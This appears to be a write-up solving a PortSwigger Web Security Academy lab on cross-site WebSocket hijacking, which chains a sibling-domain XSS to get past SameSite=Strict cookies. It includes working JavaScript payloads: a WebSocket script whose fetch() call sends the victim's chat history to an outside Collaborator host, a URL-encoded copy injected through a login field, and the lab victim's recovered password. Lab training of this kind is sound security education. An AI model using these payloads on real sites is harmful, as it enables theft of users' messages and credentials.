## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/1caf2613-97bd-408c-b8be-1207c3939685)

## Solution :

Now we go to the lab website:

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/3bd67f6f-4db6-4932-ac23-666494c80bb9)

Ok, note that there is a “Live Chat” on the right-hand side on the top. We click that.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/2be1ff38-156d-486f-9f74-d978e634184e)

So we randomly input some words in the text box.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/84eb4e0a-6d02-4230-a69c-628d63caee8c)

This is because our browser has stored our sessions, and every time we visit this /chat webpage, our browser sends the session value.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/a803ac46-5a16-4b25-949e-a2c3b3513394)

>the SameSite=Strict property prevents the session from being sent if the web is visited through code (javascript) automatically. But if you are manually changing the address bar to visit the chat webpage, the session is allowed to be sent. And once you visit that /chat through code, your browser won’t send the session value and this value would be forgotten by your browser. This explains why refreshing does not see the chats.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/7e794cb7-65b4-4725-a1ee-e2270f4089a8)

In the browser, go to the exploit server and use the following template to create a script for a CSWSH proof of concept:

```html
<script>
    var ws = new WebSocket('wss://0ae0003304f26a8c80259e7b00a40040.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://1egq0nolwqq49rmg8ut5hdaxcoif65uu.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

> Because this exploit visits the /chat webpage by code, thus no sessions would be sent, and you can not see the chat history at all! Since now the session is already forgotten by our browser, we need to re-enter some words in the /chat webpage and sent that again to create some chat history.

This web page contains a cross-site scripting (XSS) vulnerability. You can execute arbitrary javascript code in the Username field.

Store and view the exploit .

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/5e762489-3561-4b83-bffd-9273d00b7391)

In Burp, go back to the Collaborator tab and click Poll now. Observe that you have received an HTTP interaction, which indicates that you've opened a new live chat connection with the target site.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/ddfc72f3-fe97-4d8c-b556-bd93d6c76dd5)

Notice that although you've confirmed the CSWSH vulnerability, you've only exfiltrated the chat history for a brand new session, which isn't particularly useful.

In the response, notice that the website explicitly specifies `SameSite=Strict` when setting session cookies. This prevents the browser from including these cookies in cross-site requests.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/0e25d2c0-ebbc-4f82-b9bd-9e043dc0ba47)

## Identify an additional vulnerability in the same "site"

In Burp, study the proxy history and notice that responses to requests for resources like script and image files contain an `Access-Control-Allow-Origin header`, which reveals a sibling domain at `cms-YOUR-LAB-ID.web-security-academy.net`.

Recreate the CSWSH script that you tested on the exploit server earlier.

```html
<script>
    var ws = new WebSocket('wss://0ae0003304f26a8c80259e7b00a40040.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://1egq0nolwqq49rmg8ut5hdaxcoif65uu.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

URL encode the entire script.

```
%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%65%30%30%30%33%33%30%34%66%32%36%61%38%63%38%30%32%35%39%65%37%62%30%30%61%34%30%30%34%30%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%31%65%67%71%30%6e%6f%6c%77%71%71%34%39%72%6d%67%38%75%74%35%68%64%61%78%63%6f%69%66%36%35%75%75%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e%0a%0a
```

Go back to the exploit server and create a script that induces the viewer's browser to send the GET request you just tested, but use the URL-encoded CSWSH payload as the username parameter.

```html
<script>
    document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything";
</script>
```

Final payload -

```html
<script>
    document.location = "https://cms-0ae0003304f26a8c80259e7b00a40040.web-security-academ.net/login?username=
%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%65%30%30%30%33%33%30%34%66%32%36%61%38%63%38%30%32%35%39%65%37%62%30%30%61%34%30%30%34%30%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%31%65%67%71%30%6e%6f%6c%77%71%71%34%39%72%6d%67%38%75%74%35%68%64%61%78%63%6f%69%66%36%35%75%75%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e%0a%0a&password=anything";
</script>
```

Store and Deliver the exploit .

In Burp, go back to the Collaborator tab and click Poll now. Observe that you've received a number of new interactions, which contain your entire chat history.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/c598cbe0-da05-4bfd-967b-58d599bc0761)

Study the HTTP interactions and notice that these contain the victim's chat history.Find a message containing the victim's username and password.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/7368ab14-d256-4314-9050-10a43d393725)

 username =`carlos` 
 password= `ixltv1rh7aosnz665dc9`

Use the newly obtained credentials to log in to the victim's account and the lab is solved.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/81596910-a32d-4be7-be1a-06f5be9042be)
